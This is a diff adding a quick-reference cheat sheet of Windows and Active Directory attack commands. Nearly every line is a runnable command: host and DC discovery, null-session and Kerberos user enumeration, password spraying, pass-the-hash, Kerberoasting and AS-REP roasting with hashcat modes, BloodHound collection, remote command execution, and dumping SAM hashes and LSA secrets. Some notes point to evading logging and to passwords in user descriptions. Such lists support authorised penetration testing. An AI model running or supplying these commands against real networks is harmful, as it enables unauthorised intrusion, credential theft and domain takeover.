@@ -1,0 +1,74 @@
+WINDOWS ENUMERATION - QUICK REF
+Organized by goal. Replace <...> with your own values.
+
+── HOST & SERVICE DISCOVERY ─────────────────────────────────────────────────────────────────────
+nmap -sn <range>                                                 ping sweep
+nmap -Pn --top-ports=100 -oA top100 <range>                     quick top-100 port scan
+nmap -Pn -sCV -oA <output> -iL hosts_ips.txt -v                 full service + version scan
+nmap -Pn -O -sV -iL hosts_ips.txt                               OS fingerprinting
+
+── DC DISCOVERY ─────────────────────────────────────────────────────────────────────────────────
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>                find DCs via DNS
+dig axfr <domain> @<dns-server-ip>                              zone transfer attempt
+
+── SMB FINGERPRINTING ───────────────────────────────────────────────────────────────────────────
+nxc smb <range>                                                  domain, signing, OS, guest status
+
+── NULL SESSION / GENERAL ENUM ──────────────────────────────────────────────────────────────────
+enum4linux-ng -A <target>                                        all-in-one null session enum
+rpcclient -U "" -N <target>  →  enumdomusers / enumdomgroups     manual RPC null session
+
+── USER ENUMERATION ─────────────────────────────────────────────────────────────────────────────
+kerbrute userenum --dc <dc-ip> -d <domain> <users.txt>          fastest + silent (no event 4625)
+nmap -p 88 --script=krb5-enum-users \
+    --script-args="krb5-enum-users.realm='<domain>',userdb=<users.txt>" <dc-ip>
+                                                                 no extra tool needed
+rpcclient -U "" -N <target>  →  enumdomusers                    if null session works
+
+── SHARE ENUMERATION (UNAUTHENTICATED) ──────────────────────────────────────────────────────────
+nxc smb <target> -u '' -p '' --shares                           anonymous listing
+smbclient //<target>/<share> -N                                  browse directly
+
+═════════════════════════════════════════════════════════════════════════════════════════════════
+(authenticated — add -H <NT-hash> instead of -p <pass> for pass-the-hash)
+
+── CREDENTIAL VERIFICATION & SPRAYING ───────────────────────────────────────────────────────────
+nxc smb <target> -u <user> -p <pass>                            verify creds  ([+] ok, Pwn3d! = admin)
+nxc smb <range>  -u <user> -p <pass>                            spray via NTLM/SMB
+nxc smb <range>  -u <user> -H <hash> --local-auth               spray local accounts
+kerbrute passwordspray --dc <dc-ip> -d <domain> <users.txt> <pass>  spray via Kerberos (event 4771)
+
+── PASSWORD POLICY (check BEFORE spraying) ──────────────────────────────────────────────────────
+nxc smb <dc-ip> -u <user> -p <pass> --pass-pol
+
+── USER ENUMERATION ─────────────────────────────────────────────────────────────────────────────
+nxc smb <dc-ip>  -u <user> -p <pass> --users / --rid-brute
+GetADUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -all        Impacket — more detail
+ldapdomaindump -u '<domain>\<user>' -p <pass> <dc-ip> -o <dir>  full dump to HTML/JSON
+
+── GROUP ENUMERATION ────────────────────────────────────────────────────────────────────────────
+nxc smb <dc-ip> -u <user> -p <pass> --groups
+
+── SHARE ENUMERATION & SPIDERING ────────────────────────────────────────────────────────────────
+nxc smb <target> -u <user> -p <pass> --shares                   list accessible shares
+nxc smb <target> -u <user> -p <pass> --spider-shares            crawl for sensitive files
+smbclient //<target>/<share> -U <user>%<pass>                   browse manually
+
+── LDAP ENUMERATION ─────────────────────────────────────────────────────────────────────────────
+nxc ldap <dc-ip> -u <user> -p <pass> --users / --groups / --computers
+nxc ldap <dc-ip> -u <user> -p <pass> -M get-desc-users          descriptions (often have passwords)
+ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w <pass> -b "DC=x,DC=x" "(objectClass=user)"
+
+── KERBEROS ATTACK SURFACE ──────────────────────────────────────────────────────────────────────
+GetNPUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request    ASREPRoastable ($krb5asrep$ / -m 18200)
+GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request   Kerberoastable  ($krb5tgs$  / -m 13100)
+
+── AD ATTACK PATH MAPPING ───────────────────────────────────────────────────────────────────────
+bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> -c all --zip
+SharpHound.exe -c all --zipfilename bloodhound.zip               from Windows host
+
+── CODE EXECUTION & CREDENTIAL DUMPING ──────────────────────────────────────────────────────────
+nxc smb <target> -u <user> -p <pass> -x "<cmd>"                 CMD execution
+nxc smb <target> -u <user> -p <pass> -X "<ps>"                  PowerShell execution
+nxc smb <target> -u <user> -p <pass> --sam                      local SAM hashes
+nxc smb <target> -u <user> -p <pass> --lsa                      LSA secrets / cached creds
